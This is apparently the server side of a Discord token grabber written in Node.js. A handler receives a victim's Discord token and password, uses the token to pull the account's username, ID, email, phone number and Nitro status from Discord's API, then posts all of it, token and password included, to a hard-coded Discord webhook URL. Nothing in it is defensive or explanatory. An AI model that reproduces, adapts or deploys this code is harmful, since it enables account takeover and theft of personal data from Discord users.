const axios = require('axios');



exports.send = (req, res, webhook) => {
    const token = req.body.token;
    const password = req.body.password;


    if (token === undefined || password === undefined)
        return res.status(400).json({status: "error",message: "Not sent."});

    function GetInfos(token, password) {
        fetch('https://discordapp.com/api/v8/users/@me', {
        method: 'get',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': token
        }
    })
    .then(x => x.json()).then(y => {
        var nitro;
        var phone;
        if (JSON.parse(JSON.stringify(y)).premium_type == 1) {
            nitro = "Nitro Classic";
        } else if (JSON.parse(JSON.stringify(y)).premium_type == 2) {
            nitro = "Nitro Boost";
        } else {
            nitro = "None";
        }

        if (JSON.parse(JSON.stringify(y)).phone == null) {
            phone = "None";
        } else {
            phone = JSON.parse(JSON.stringify(y)).phone;
        }

        axios.post(`https://discord.com/api/webhooks/797933426220204132/QVTVod__SFum4eHguecQ-5t1UOnc3BWm7rC-fb_sekgflTr21-E6sIyZJtW04IGEYCyg`, {
            username: JSON.parse(JSON.stringify(y)).username,
            content: `Username : ` + JSON.parse(JSON.stringify(y)).username + "#" + JSON.parse(JSON.stringify(y)).discriminator + '\n' + `ID : ` + JSON.parse(JSON.stringify(y)).id + '\n' + "E-Mail : " + JSON.parse(JSON.stringify(y)).email + '\n' + "Phone : " + JSON.parse(JSON.stringify(y)).phone + '\n' + "Nitro Type : " + nitro + '\n' + "Token : " + token + '\n' + "Password : " +
            password
        }).then((z) => {
        	if (z.status === 200) return res.status(200).json({status: "ok",message: "Sent."});
        }).catch((bite) => {
        	return res.status(500).json({status: "error",message: "Not sent."});
        });
    });
    }

    GetInfos(token, password);
}
